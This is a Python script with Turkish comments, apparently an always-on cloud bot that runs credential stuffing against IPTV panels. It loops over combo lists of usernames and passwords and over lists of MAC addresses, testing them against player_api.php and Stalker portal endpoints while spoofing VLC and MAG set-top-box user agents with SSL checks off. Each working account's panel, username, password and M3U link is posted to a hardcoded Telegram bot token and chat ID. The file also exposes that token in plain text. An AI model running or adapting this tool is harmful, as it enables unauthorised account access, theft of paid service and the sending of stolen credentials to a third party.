import os
import time
import threading
import glob
import requests
from flask import Flask
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask('')

@app.route('/')
def home():
    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- TELEGRAM AYARLARI ---
TOKEN = "9296501081:AAGTNmvWB8Qn8-kVxGNoJcC8LXTLb8lnZ94"
CHAT_ID = "39743305"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"[!] Telegram mesajı gönderilemedi: {e}")

def m3u_tara(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    headers = {
        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
    }
    try:
        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            if '"auth":1' in res.text or '"status":"Active"' in res.text:
                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                mesaj = (
                    f"🔥 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                    f"🌐 <b>Panel:</b> http://{panel}\n"
                    f"👤 <b>User:</b> <code>{user}</code>\n"
                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
                    f"🔗 <b>M3U:</b> {m3ulink}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def mac_tara(panel, mac):
    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
    try:
        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
            mesaj = (
                f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"💻 <b>MAC:</b> <code>{mac}</code>"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
    
    while True:
        try:
            print("[i] Tarama turu başlıyor, klasörler taranıyor...")
            
            # 1. Klasörlerdeki tüm dosyaları otomatik bul (Parçalı dosyalar dahil)
            combo_dosyalari = glob.glob(os.path.join("combo", "*.txt"))
            mac_dosyalari = glob.glob(os.path.join("mac_list", "*.txt"))
            panel_dosyalari = glob.glob(os.path.join("panel_list", "*.txt"))
            
            # Panelleri oku
            paneller = []
            for p_dosya in panel_dosyalari:
                with open(p_dosya, "r", encoding="utf-8", errors="ignore") as f:
                    for satir in f:
                        p = satir.strip()
                        if p and p not in paneller:
                            paneller.append(p)
            
            # Macleri oku
            maclar = []
            for m_dosya in mac_dosyalari:
                with open(m_dosya, "r", encoding="utf-8", errors="ignore") as f:
                    for satir in f:
                        m = satir.strip()
                        if m and m not in maclar:
                            maclar.append(m)

            print(f"[i] Toplam {len(paneller)} panel, {len(maclar)} MAC ve {len(combo_dosyalari)} adet combo dosyası yüklendi.")

            # 2. MAC Taraması Örneği
            for panel in paneller:
                for mac in maclar:
                    mac_tara(panel, mac)

            # 3. Combo (Combo: user:pass) Taraması Örneği
            for combo_dosya in combo_dosyalari:
                print(f"[i] İşlenen combo dosyası: {os.path.basename(combo_dosya)}")
                with open(combo_dosya, "r", encoding="utf-8", errors="ignore") as f:
                    for satir in f:
                        parca = satir.strip().split(':')
                        if len(parca) >= 2:
                            user = parca[0]
                            pas = parca[1]
                            for panel in paneller:
                                m3u_tara(panel, user, pas)

            print("[i] Tarama turu tamamlandı, 30 dakika bekleniyor...")
            time.sleep(1800)  # 30 dk bekleme
            
        except Exception as e:
            print(f"[!] Hata: {e}")
            time.sleep(60)

if __name__ == '__main__':
    # Flask sunucusunu ayrı bir thread'de (arkada) çalıştır
    t = threading.Thread(target=run_web)
    t.start()
        
    # Tarayıcı döngüsünü başlat
    arka_plan_tarayici()
